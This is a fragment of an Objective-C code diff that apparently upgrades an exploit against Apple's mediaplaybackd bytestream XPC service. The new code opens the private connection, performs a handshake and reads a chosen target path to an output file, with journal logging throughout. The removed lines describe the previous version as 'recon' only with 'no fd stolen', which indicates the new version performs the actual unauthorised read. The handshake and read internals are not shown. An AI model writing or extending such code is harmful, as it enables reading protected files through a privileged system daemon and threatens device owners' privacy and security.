+    BOOL readOK = NO;
+    @try {
+        [session log:@"BEGIN mode=%@ target=%@ os=%@", mode, targetPath, NSProcessInfo.processInfo.operatingSystemVersionString];
+        [session log:@"JOURNAL path=%@", journalPath];
+        [session log:@"SYMBOLS ready=%d error=%@", gBSAPI.ready, gBSAPI.error ?: @"none"];
+        if (!gBSAPI.ready) return session.report;
+        session.connection = gBSAPI.connectionCreate("com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
+        [session log:@"XPC_CREATE connection=%p", session.connection];
+        if (!session.connection) return session.report;
+        __weak KPByteStreamSession *weakSession = session;
+        xpc_connection_set_event_handler(session.connection, ^(xpc_object_t event) {
+            KPByteStreamSession *strongSession = weakSession;
+            [strongSession log:@"XPC_EVENT type=%@ description=%@", KPBSTypeName(event), KPBSDescription(event)];
+        });
+        xpc_connection_resume(session.connection);
+        [session log:@"XPC_RESUMED service=com.apple.coremedia.mediaplaybackd.bytestream.xpc"];
+        handshake = [session performHandshake];
+        [session log:@"HANDSHAKE_RESULT ready=%d", handshake];
+        if (!handshake) return session.report;
+        readOK = [session readTarget:targetPath output:outputURL];
+        [session log:@"READ_RESULT success=%d target=%@", readOK, targetPath];
+        return session.report;
+    } @finally {
+        if (session.connection) {
+            xpc_connection_cancel(session.connection);
+            xpc_release(session.connection);
+            session.connection = NULL;
+            [session log:@"XPC_CANCELLED"];
         }
+        if (session.memoryOrigin) {
+            CFRelease(session.memoryOrigin);
+            session.memoryOrigin = NULL;
+        }
+        if (session.memoryRecipient) {
+            CFRelease(session.memoryRecipient);
+            session.memoryRecipient = NULL;
+        }
+        [session log:@"END mode=%@ handshake=%d read=%d", mode, handshake, readOK];
+        @synchronized (session) {
+            session.journalFD = -1;
+        }
+        close(journalFD);
     }
-
-    // Verdict
-    [report appendString:@"\n"];
-    [report appendString:@"VERDICT: RECON_COMPLETE\n"];
-    [report appendString:@"No fd stolen � this is availability check only.\n"];
-    return report;
 }
 
 @end
